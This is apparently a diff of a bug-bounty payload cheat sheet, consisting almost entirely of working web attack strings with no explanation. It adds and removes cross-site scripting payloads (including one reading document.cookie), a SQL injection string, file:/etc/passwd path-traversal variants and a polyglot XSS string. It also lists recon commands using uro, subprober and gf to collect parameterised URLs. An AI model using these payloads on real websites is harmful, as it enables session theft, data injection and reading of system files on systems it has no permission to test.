@@ -1,13 +1,19 @@
-<​script/src=//⑮.rs>
-<i/oncut​=alert()> (CTRL +X )
-<svg/onload​=alert()
+"><svg/onload=confirm(1)>"@x
+'or 1=1 limit 1-- -
+
+>> https://x.com/brutelogic?mx=2
+
+'"()><img src="x"><a href="https://google.com">click</a>
+"><img src=x onerror=alert(document.cookie);>
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
 
 file:/etc/passwd%3F/ 
-file:/etc%252Fpasswd/ 
-file:/etc%252Fpasswd%3F/ 
-file:///etc/%3F/../passwd 
-file:${br}/et${u}c%252Fpas${te}swd%3F/ 
-file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
+file:///etc/x%252Fy/../passwd?/../passwd
 
 JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus​= /*${/*/;{/**/(alert)(1)}//><Base/Href=//hello\76-->
 
@@ -58,17 +64,6 @@ uro -i filtered-extensions-links.txt -o uro.txt
 subprober -f uro.txt -sc -ar -o 1337.txt -nc -mc 200 301 302 307 308 403 -c 20
 cat uro.txt | gf or
 grep "=" uro.txt | sed 's/=\(.*\)/=/' | tee -a urls.txt
-
-
-'or 1=1 limit 1-- -
-'"()><img src="x"><a href="https://google.com">click</a>
-%22%27%3E%3CA%20HREF=%22http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D%22%3EXSS%3C/A%3E
-x" onerror​="alert(1)
-<img src="YOUR_LINK_HERE">
-'"><A HRef=\" AutoFocus OnFocus​=top/**/?.document%2Bcookie>
-'-confirm(/OPENBUGBOUNTY/)//
-<sVg/onfake="x=y"oNload​=prompt(/OPENBUGBOUNTY/)>
-website*com/test/%22%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e
 
 XSS => LFI
 <script>
